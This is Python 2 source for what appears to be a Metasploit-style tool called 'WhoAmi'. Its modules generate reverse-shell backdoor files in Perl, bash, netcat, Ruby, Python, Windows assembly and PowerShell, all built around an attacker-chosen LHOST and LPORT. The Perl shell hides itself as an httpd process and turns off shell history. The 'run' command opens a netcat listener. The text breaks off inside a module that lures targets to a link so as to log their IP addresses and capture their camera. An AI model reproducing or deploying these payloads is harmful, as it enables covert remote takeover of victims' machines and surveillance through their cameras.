     payload_unix_perl_reverse_tcp()
  elif  amerr[:9] == "set lport" or  amerr[:9] == "set LPORT" :
     lport[0] = amerr[10:]
     print "LPORT => ", lport[0]
     payload_unix_perl_reverse_tcp()
  elif  amerr[:9] == "set lname" or  amerr[:9] == "set LNAME" :
     lperlname[0] = amerr[10:]
     print "LNAME => ", lperlname[0]
     payload_unix_perl_reverse_tcp()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (payload_unix_perl_reverse_tcp):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        LHOST     "+lhost[0]+"           yes          The listen address "
   print"        LPORT         "+lport[0]+"              yes          The listen port "
   print"        LNAME     "+lperlname[0]+"            yes          The name of payload "
   print ""
   print ""
   payload_unix_perl_reverse_tcp()
  elif amerr[:8] == "generate" or amerr[:6] == "create":
    print ""
    print blue+"[*]"+default+ "Create a backdour"
    time.sleep(2)
    print ""
    time.sleep(2)
    print ""
    print green_underline+"[*] Done"+default
    time.sleep(2)
    print ""
    f = open(lperlname[0] , 'w')
    f.write("""
    
    

use strict;
use Socket;
use FileHandle;
use POSIX;
my $VERSION = "1.0";

# Where to send the reverse shell.  Change these.
my $ip = '"""+lhost[0]+"""';
my $port = """+lport[0]+""";

# Options
my $daemon = 1;
my $auth   = 0; # 0 means authentication is disabled and any 
		# source IP can access the reverse shell
my $authorised_client_pattern = qr(^127\.0\.0\.1$);

# Declarations
my $global_page = "";
my $fake_process_name = "/usr/sbin/apache";

# Change the process name to be less conspicious
$0 = "[httpd]";

# Authenticate based on source IP address if required
if (defined($ENV{'REMOTE_ADDR'})) {
	cgiprint("Browser IP address appears to be: $ENV{'REMOTE_ADDR'}");

	if ($auth) {
		unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {
			cgiprint("ERROR: Your client isn't authorised to view this page");
			cgiexit();
		}
	}
} elsif ($auth) {
	cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access");
	cgiexit(0);
}

# Background and dissociate from parent process if required
if ($daemon) {
	my $pid = fork();
	if ($pid) {
		cgiexit(0); # parent exits
	}

	setsid();
	chdir('/');
	umask(0);
}

# Make TCP connection for reverse shell
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
	cgiprint("Sent reverse shell to $ip:$port");
	cgiprintpage();
} else {
	cgiprint("Couldn't open reverse shell to $ip:$port: $!");
	cgiexit();	
}

# Redirect STDIN, STDOUT and STDERR to the TCP connection
open(STDIN, ">&SOCK");
open(STDOUT,">&SOCK");
open(STDERR,">&SOCK");
$ENV{'HISTFILE'} = '/dev/null';
system("w;uname -a;id;pwd");
exec({"/bin/sh"} ($fake_process_name, "-i"));

# Wrapper around print
sub cgiprint {
	my $line = shift;
	$line .= "<p>\n";
	$global_page .= $line;
}

# Wrapper around exit
sub cgiexit {
	cgiprintpage();
	exit 0; # 0 to ensure we don't give a 500 response.
}

# Form HTTP response using all the messages gathered by cgiprint so far
sub cgiprintpage {
	print "Content-Length: " . length($global_page) . "\r
Connection: close\r
Content-Type: text\/html\r\n\r\n" . $global_page;
}


        """)
    f.close()
    
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
   os.system("nc -l -p "+str(lport[0])+" -v")
   payload_unix_perl_reverse_tcp()
  elif amerr[:4] == 'help':
   help_help()
   payload_unix_perl_reverse_tcp()
  
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:6] == "banner":
    banner()
    payload_unix_perl_reverse_tcp()   
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    payload_unix_perl_reverse_tcp()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  payload_unix_perl_reverse_tcp()

 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    payload_unix_perl_reverse_tcp()

lhost = ["192.168.1.1"]
lport = ["4444"]
lbashname = ["payload.sh"]
def payload_unix_bash_reverse_tcp():
 try:
  amerr = str(raw_input(default+'WhoAmi payloads('+red+'payload_unix_bash_reverse_tcp'+default+') > '))
  
  if  amerr[:9] == "set lhost" or  amerr[:9] == "set LHOST" :
     lhost[0] = amerr[10:]
     print "LHOST => ", lhost[0]
     payload_unix_bash_reverse_tcp()
  elif  amerr[:9] == "set lport" or  amerr[:9] == "set LPORT" :
     lport[0] = amerr[10:]
     print "LPORT => ", lport[0]
     payload_unix_bash_reverse_tcp()
  elif  amerr[:9] == "set lname" or  amerr[:9] == "set LNAME" :
     lbashname[0] = amerr[10:]
     print "LNAME => ", lbashname[0]
     payload_unix_bash_reverse_tcp()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (payload_unix_bash_reverse_tcp):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        LHOST     "+lhost[0]+"           yes          The listen address "
   print"        LPORT         "+lport[0]+"              yes          The listen port "
   print"        LNAME     "+lbashname[0]+"            yes          The name of payload "
   print ""
   print ""
   payload_unix_bash_reverse_tcp()
  elif amerr[:8] == "generate" or amerr[:6] == "create":
    print ""
    print blue+"[*]"+default+ "Create a backdour"
    time.sleep(2)
    print ""
    time.sleep(2)
    print ""
    print green_underline+"[*] Done"+default
    time.sleep(2)
    print ""
    f = open(lbashname[0] , 'w')
    f.write("""
    
bash -i >& /dev/tcp/"""+lhost[0]+"""/"""+lport[0]+""" 0>&1


        """)
    f.close()
    
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
   os.system("nc -l -p "+str(lport[0])+" -v")
  elif amerr[:4] == 'help':
   help_help()
   payload_unix_bash_reverse_tcp()
  
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:6] == "banner":
    banner()
    payload_unix_bash_reverse_tcp()   
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    payload_unix_bash_reverse_tcp()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  payload_unix_bash_reverse_tcp()
  
 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    payload_unix_bash_reverse_tcp()


lhost = ["192.168.1.1"]
lport = ["4444"]
lncname = ["payload.sh"]
def payload_unix_ncat_reverse_tcp():
 try:
  amerr = str(raw_input(default+'WhoAmi payloads('+red+'payload_unix_ncat_reverse_tcp'+default+') > '))
  
  if  amerr[:9] == "set lhost" or  amerr[:9] == "set LHOST" :
     lhost[0] = amerr[10:]
     print "LHOST => ", lhost[0]
     payload_unix_ncat_reverse_tcp()
  elif  amerr[:9] == "set lport" or  amerr[:9] == "set LPORT" :
     lport[0] = amerr[10:]
     print "LPORT => ", lport[0]
     payload_unix_ncat_reverse_tcp()
  elif  amerr[:9] == "set lname" or  amerr[:9] == "set LNAME" :
     lncname[0] = amerr[10:]
     print "LNAME => ", lncname[0]
     payload_unix_ncat_reverse_tcp()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (payload_unix_ncat_reverse_tcp):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        LHOST     "+lhost[0]+"           yes          The listen address "
   print"        LPORT         "+lport[0]+"              yes          The listen port "
   print"        LNAME     "+lncname[0]+"            yes          The name of payload "
   print ""
   print ""
   payload_unix_ncat_reverse_tcp()
  elif amerr[:8] == "generate" or amerr[:6] == "create":
    print ""
    print blue+"[*]"+default+ "Create a backdour"
    time.sleep(2)
    print ""
    time.sleep(2)
    print ""
    print green_underline+"[*] Done"+default
    time.sleep(2)
    print ""
    f = open(lncname[0] , 'w')
    f.write("""
    

nc -e /bin/sh """+lhost[0]+""" """+lport[0]+"""
        """)
    f.close()
    
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
   os.system("nc -l -p "+str(lport[0])+" -v")
  elif amerr[:4] == 'help':
   help_help()
   payload_unix_ncat_reverse_tcp()
  
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:6] == "banner":
    banner()
    payload_unix_ncat_reverse_tcp()   
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    payload_unix_ncat_reverse_tcp()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  payload_unix_ncat_reverse_tcp()

 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    payload_unix_ncat_reverse_tcp()

lhost = ["192.168.1.1"]
lport = ["4444"]
lrubyname = ["payload.rb"]
def payload_unix_ruby_reverse_tcp():
 try:
  amerr = str(raw_input(default+'WhoAmi payloads('+red+'payload_unix_ruby_reverse_tcp'+default+') > '))
  
  if  amerr[:9] == "set lhost" or  amerr[:9] == "set LHOST" :
     lhost[0] = amerr[10:]
     print "LHOST => ", lhost[0]
     payload_unix_ruby_reverse_tcp()
  elif  amerr[:9] == "set lport" or  amerr[:9] == "set LPORT" :
     lport[0] = amerr[10:]
     print "LPORT => ", lport[0]
     payload_unix_ruby_reverse_tcp()
  elif  amerr[:9] == "set lname" or  amerr[:9] == "set LNAME" :
     lrubyname[0] = amerr[10:]
     print "LNAME => ", lrubyname[0]
     payload_unix_ruby_reverse_tcp()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (payload_unix_ruby_reverse_tcp):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        LHOST     "+lhost[0]+"           yes          The listen address "
   print"        LPORT         "+lport[0]+"              yes          The listen port "
   print"        LNAME     "+lrubyname[0]+"            yes          The name of payload "
   print ""
   print ""
   payload_unix_ruby_reverse_tcp()
  elif amerr[:8] == "generate" or amerr[:6] == "create":
    print ""
    print blue+"[*]"+default+ "Create a backdour"
    time.sleep(2)
    print ""
    time.sleep(2)
    print ""
    print green_underline+"[*] Done"+default
    time.sleep(2)
    print ""
    f = open(lrubyname[0] , 'w')
    f.write('''
    

#!/usr/bin/env ruby
require 'socket'
require 'open3'

RHOST = "'''+lhost[0]+'''" 
PORT = "'''+lport[0]+'''"

begin
sock = TCPSocket.new "#{RHOST}", "#{PORT}"
rescue
	sleep 20
	retry
	end

begin
	while line = sock.gets
	    Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
	        IO.copy_stream(stdout_and_stderr, sock)
	        end  
	end
rescue
	retry
end 
        ''')
    f.close()
    
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
   os.system("nc -l -p "+str(lport[0])+" -v")
  elif amerr[:4] == 'help':
   help_help()
   payload_unix_ruby_reverse_tcp()
  
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:6] == "banner":
    banner()
    payload_unix_ruby_reverse_tcp()   
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    payload_unix_ruby_reverse_tcp()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  payload_unix_ruby_reverse_tcp()

 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    payload_unix_ruby_reverse_tcp()

lhost = ["192.168.1.1"]
lport = ["4444"]
lpyname = ["payload.py"]
def payload_unix_python2_reverse_tcp():
 try:
  amerr = str(raw_input(default+'WhoAmi payloads('+red+'payload_unix_python2_reverse_tcp'+default+') > '))
  
  if  amerr[:9] == "set lhost" or  amerr[:9] == "set LHOST" :
     lhost[0] = amerr[10:]
     print "LHOST => ", lhost[0]
     payload_unix_python2_reverse_tcp()
  elif  amerr[:9] == "set lport" or  amerr[:9] == "set LPORT" :
     lport[0] = amerr[10:]
     print "LPORT => ", lport[0]
     payload_unix_python2_reverse_tcp()
  elif  amerr[:9] == "set lname" or  amerr[:9] == "set LNAME" :
     lpyname[0] = amerr[10:]
     print "LNAME => ", lpyname[0]
     payload_unix_python2_reverse_tcp()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (payload_unix_python2_reverse_tcp):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        LHOST     "+lhost[0]+"           yes          The listen address "
   print"        LPORT         "+lport[0]+"              yes          The listen port "
   print"        LNAME     "+lpyname[0]+"            yes          The name of payload "
   print ""
   print ""
   payload_unix_python2_reverse_tcp()
  elif amerr[:8] == "generate" or amerr[:6] == "create":
    print ""
    print blue+"[*]"+default+ "Create a backdour"
    time.sleep(2)
    print ""
    time.sleep(2)
    print ""
    print green_underline+"[*] Done"+default
    time.sleep(2)
    print ""
    f = open(lpyname[0] , 'w')
    f.write('''
    
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("'''+lhost[0]+'''",'''+lport[0]+'''))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"]);

        ''')
    f.close()
    
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
   os.system("nc -l -p "+str(lport[0])+" -v")
  elif amerr[:4] == 'help':
   help_help()
   payload_unix_python2_reverse_tcp()
  
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:6] == "banner":
    banner()
    payload_unix_python2_reverse_tcp()   
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    payload_unix_python2_reverse_tcp()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  payload_unix_python2_reverse_tcp()
 
 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    payload_unix_python2_reverse_tcp()

def payload_windows_asm_reverse_tcp():
 try:
  amerr = str(raw_input(default+'WhoAmi payloads('+red+'payload_windows_asm_reverse_tcp'+default+') > '))
  
  if  amerr[:9] == "set lhost" or  amerr[:9] == "set LHOST" :
     lhost[0] = amerr[10:]
     print "LHOST => ", lhost[0]
     payload_windows_asm_reverse_tcp()
  elif  amerr[:9] == "set lport" or  amerr[:9] == "set LPORT" :
     lport[0] = amerr[10:]
     print "LPORT => ", lport[0]
     payload_windows_asm_reverse_tcp()
  elif  amerr[:9] == "set lname" or  amerr[:9] == "set LNAME" :
     lasmname[0] = amerr[10:]
     print "LNAME => ", lasmname[0]
     payload_windows_asm_reverse_tcp()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (payload_windows_asm_reverse_tcp):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        LHOST     "+lhost[0]+"           yes          The listen address "
   print"        LPORT         "+lport[0]+"              yes          The listen port "
   print"        LNAME     "+lasmname[0]+"             yes          The name of payload "
   print ""
   print ""
   payload_windows_asm_reverse_tcp()
  elif amerr[:8] == "generate" or amerr[:6] == "create":
    print ""
    print blue+"[*]"+default+ "Create a backdour"
    time.sleep(2)
    print ""
    time.sleep(2)
    print ""
    print green_underline+"[*] Done"+default
    time.sleep(2)
    print ""
    f = open(lasmname[0] , 'w')
    f.write('''
    
.386
.model flat, stdcall
option casemap:none
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\ws2_32.inc
include \masm32\include\masm32.inc
includelib \masm32\lib\ws2_32.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\masm32.lib 

.data
  cmd     db "cmd",0
  UrIP    db "'''+lhost[0]+'''",0
  port    db "'''+lport[0]+'''",0
.data?
  sinfo   STARTUPINFO<>
  pi      PROCESS_INFORMATION<>
  sin     sockaddr_in<>
  WSAD    WSADATA<>
  Wsocket dd ?
.code
start:
    invoke WSAStartup, 101h, addr WSAD 
    invoke WSASocket,AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0
           mov Wsocket, eax
           mov sin.sin_family, 2
    invoke atodw, addr port
    invoke htons, eax
           mov sin.sin_port, ax
    invoke gethostbyname, addr UrIP
          mov eax, [eax+12]
          mov eax, [eax]
          mov eax, [eax]
          mov sin.sin_addr, eax

          mov eax,Wsocket
          mov sinfo.hStdInput,eax
          mov sinfo.hStdOutput,eax
          mov sinfo.hStdError,eax     
          mov sinfo.cb,sizeof STARTUPINFO
          mov sinfo.dwFlags,STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES
 shellagain:
    invoke connect, Wsocket, addr sin , sizeof(sockaddr_in) 
    invoke CreateProcess,NULL,addr cmd,NULL,NULL,TRUE,8000040h,NULL,NULL,addr sinfo,addr pi
    invoke WaitForSingleObject,pi.hProcess,INFINITE
	jmp shellagain
 ret
end start
	

        ''')
    f.close()
    
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
   os.system("nc -l -p "+str(lport[0])+" -v")
  elif amerr[:4] == 'help':
   help_help()
   payload_windows_asm_reverse_tcp()
  
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:6] == "banner":
    banner()
    payload_windows_asm_reverse_tcp()   
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    payload_windows_asm_reverse_tcp()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  payload_windows_asm_reverse_tcp() 

 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    payload_windows_asm_reverse_tcp()

lhost = ["192.168.1.1"]
lport = ["4444"]
lpsname = ["payload.ps1"]
def payload_windows_ps_reverse_tcp():
 try:
  amerr = str(raw_input(default+'WhoAmi payloads('+red+'payload_windows_ps_reverse_tcp'+default+') > '))
  
  if  amerr[:9] == "set lhost" or  amerr[:9] == "set LHOST" :
     lhost[0] = amerr[10:]
     print "LHOST => ", lhost[0]
     payload_windows_ps_reverse_tcp()
  elif  amerr[:9] == "set lport" or  amerr[:9] == "set LPORT" :
     lport[0] = amerr[10:]
     print "LPORT => ", lport[0]
     payload_windows_ps_reverse_tcp()
  elif  amerr[:9] == "set lname" or  amerr[:9] == "set LNAME" :
     lpsname[0] = amerr[10:]
     print "LNAME => ", lpsname[0]
     payload_windows_ps_reverse_tcp()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (payload_windows_ps_reverse_tcp):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        LHOST     "+lhost[0]+"           yes          The listen address "
   print"        LPORT         "+lport[0]+"              yes          The listen port "
   print"        LNAME     "+lpsname[0]+"           yes          The name of payload "
   print ""
   print ""
   payload_windows_ps_reverse_tcp()
  elif amerr[:8] == "generate" or amerr[:6] == "create":
    print ""
    print blue+"[*]"+default+ "Create a backdour"
    time.sleep(2)
    print ""
    time.sleep(2)
    print ""
    print green_underline+"[*] Done"+default
    time.sleep(2)
    print ""
    f = open(lpsname[0] , 'w')
    f.write('''

$client = New-Object System.Net.Sockets.TCPClient("'''+lhost[0]+'''",'''+lport[0]+''');$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	

        ''')
    f.close()
    
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
   os.system("nc -l -p "+str(lport[0])+" -v")
  elif amerr[:4] == 'help':
   help_help()
   payload_windows_ps_reverse_tcp()
  
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:6] == "banner":
    banner()
    payload_windows_ps_reverse_tcp()   
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    payload_windows_ps_reverse_tcp()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  payload_windows_ps_reverse_tcp()
  
 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    payload_windows_ps_reverse_tcp()

lhost = ["192.168.1.1"]
lport = ["4444"]
lplname = ["payload.pl"]
def payload_unix_perl2_reverse_tcp():
 try: 
  amerr = str(raw_input(default+'WhoAmi payloads('+red+'payload_unix_perl2_reverse_tcp'+default+') > '))
  
  if  amerr[:9] == "set lhost" or  amerr[:9] == "set LHOST" :
     lhost[0] = amerr[10:]
     print "LHOST => ", lhost[0]
     payload_unix_perl2_reverse_tcp()
  elif  amerr[:9] == "set lport" or  amerr[:9] == "set LPORT" :
     lport[0] = amerr[10:]
     print "LPORT => ", lport[0]
     payload_unix_perl2_reverse_tcp()
  elif  amerr[:9] == "set lname" or  amerr[:9] == "set LNAME" :
     lplname[0] = amerr[10:]
     print "LNAME => ", lplname[0]
     payload_unix_perl2_reverse_tcp()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (payload_unix_perl2_reverse_tcp):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        LHOST     "+lhost[0]+"           yes          The listen address "
   print"        LPORT         "+lport[0]+"              yes          The listen port "
   print"        LNAME     "+lplname[0]+"            yes          The name of payload "
   print ""
   print ""
   payload_unix_perl2_reverse_tcp()
  elif amerr[:8] == "generate" or amerr[:6] == "create":
    print ""
    print blue+"[*]"+default+ "Create a backdour"
    time.sleep(2)
    print ""
    time.sleep(2)
    print ""
    print green_underline+"[*] Done"+default
    time.sleep(2)
    print ""
    f = open(lplname[0] , 'w')
    f.write('''
    
    
perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"'''+lhost[0]+''':'''+lport[0]+'''");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'


        ''')
    f.close()
    
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
   os.system("nc -l -p "+str(lport[0])+" -v")
   payload_unix_perl2_reverse_tcp()
  elif amerr[:4] == 'help':
   help_help()
   payload_unix_perl2_reverse_tcp()
  
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:6] == "banner":
    banner()
    payload_unix_perl2_reverse_tcp()   
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    payload_unix_perl2_reverse_tcp()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  payload_unix_perl2_reverse_tcp()

 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    payload_unix_perl2_reverse_tcp()
    
lport = ["3333"]
def payload_camera_html_reverse_tcp():
 try:
  amerr = str(raw_input(default+'WhoAmi payloads('+red+'payload_camera_html_reverse_tcp'+default+') > '))
  
  if  amerr[:9] == "set lport" or  amerr[:9] == "set LPORT" :
     lport[0] = amerr[10:]
     print "LPORT => ", lport[0]
     payload_camera_html_reverse_tcp()

  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (payload_camera_html_reverse_tcp):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        LPORT         "+lport[0]+"              yes          The listen port "
   print ""
   print ""
   payload_camera_html_reverse_tcp()
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
    f = open("say.sh" , 'w')
    f.write('''

rm -rf say.sh
catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
cat ip.txt >> saved.ip.txt
}
dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
}
checkfound() {
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do
if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt
fi
sleep 0.5
if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5
done 
}
payload() {
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
sed 's+forwarding_link+'$send_link'+g' index2.html > index.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php
}
server() {
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
